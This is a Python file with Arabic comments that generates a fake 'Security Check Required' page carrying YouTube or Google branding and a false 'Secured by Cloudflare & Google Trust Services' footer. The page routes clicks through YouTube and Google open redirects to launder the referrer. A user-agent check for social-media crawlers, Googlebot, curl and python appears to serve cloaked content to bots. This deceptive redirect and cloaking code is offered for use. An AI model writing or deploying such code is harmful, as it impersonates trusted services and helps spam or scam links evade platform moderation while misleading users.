import random
import urllib.parse

def get_laundry_html(target_url):
    # --- The Elite Blender V2 (User-Action Edition) ---
    # الهدف: إجبار المتصفح على إرسال Referrer قوي (Youtube/Google) عبر نقرة حقيقية.
    
    # 1. تجهيز الروابط المشفرة
    encoded_target = urllib.parse.quote(target_url)
    
    # بوابة يوتيوب (الأقوى والأكثر ثقة)
    youtube_url = f"https://www.youtube.com/redirect?q={encoded_target}"
    
    # بوابة صور جوجل (لتنويع المصادر)
    google_images_url = f"https://images.google.com/url?q={encoded_target}"
    
    # 2. الاختيار العشوائي (50% يوتيوب - 50% جوجل)
    # يمكنك تكرار youtube_url في القائمة لزيادة نسبته إذا أردت
    gateways = [youtube_url, google_images_url]
    chosen_gateway = random.choice(gateways)
    
    # 3. تخصيص التصميم بناءً على البوابة المختارة
    if "youtube" in chosen_gateway:
        # ثيم يوتيوب الأحمر
        theme_color = "#FF0000"
        logo_svg = '<svg viewBox="0 0 24 24" fill="currentColor"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>'
        btn_text = "Verify & Continue"
    else:
        # ثيم جوجل الأزرق
        theme_color = "#4285F4"
        logo_svg = '<svg viewBox="0 0 24 24" fill="currentColor"><path d="M12.48 10.92v3.28h7.84c-.24 1.84-.853 3.187-1.787 4.133-1.147 1.147-2.933 2.4-6.053 2.4-4.827 0-8.6-3.893-8.6-8.72s3.773-8.72 8.6-8.72c2.6 0 4.507 1.027 5.907 2.347l2.307-2.307C18.747 1.44 16.133 0 12.48 0 5.867 0 .307 5.387.307 12s5.56 12 12.173 12c3.573 0 6.267-1.173 8.373-3.36 2.16-2.16 2.84-5.213 2.84-7.667 0-.76-.053-1.467-.173-2.053H12.48z"/></svg>'
        btn_text = "Security Check"

    # 4. صفحة التفاعل (HTML)
    return f'''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Security Verification</title>
        <style>
            body {{ font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }}
            .card {{ background: white; padding: 40px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); text-align: center; max-width: 400px; width: 90%; }}
            .logo {{ width: 60px; height: 60px; color: {theme_color}; margin-bottom: 20px; display: inline-block; }}
            h1 {{ font-size: 20px; color: #1a1a1a; margin: 0 0 10px 0; }}
            p {{ color: #5f6368; font-size: 14px; margin-bottom: 30px; line-height: 1.5; }}
            .btn {{ background-color: {theme_color}; color: white; border: none; padding: 12px 30px; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: opacity 0.2s; text-decoration: none; display: inline-block; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }}
            .btn:hover {{ opacity: 0.9; transform: translateY(-1px); }}
            .footer {{ margin-top: 20px; font-size: 11px; color: #9aa0a6; }}
            .secure-icon {{ vertical-align: middle; margin-right: 5px; }}
        </style>
    </head>
    <body>
        <div class="card">
            <div class="logo">
                {logo_svg}
            </div>
            <h1>Security Check Required</h1>
            <p>To ensure a secure connection, please verify that you are a human by clicking the button below.</p>
            
            <a href="{chosen_gateway}" class="btn">
                <span>🛡️</span> {btn_text}
            </a>
            
            <div class="footer">
                Secured by <strong>Cloudflare</strong> & <strong>Google Trust Services</strong>
            </div>
        </div>

        <script>
            // منع الرجوع للخلف (History Replace) لزيادة الأمان
            if (window.history.replaceState) {{
                window.history.replaceState(null, null, window.location.href);
            }}
        </script>
    </body>
    </html>
    '''

def is_bot(user_agent):
    if not user_agent: return True
    # قائمة البوتات المعروفة
    BOT_AGENTS = [
        "facebookexternalhit", "Facebot", "Twitterbot", "LinkedInBot",
        "WhatsApp", "TelegramBot", "Googlebot", "AdsBot", "crawler", "curl", "python"
    ]
    for bot in BOT_AGENTS:
        if bot.lower() in user_agent.lower():
            return True
    return False
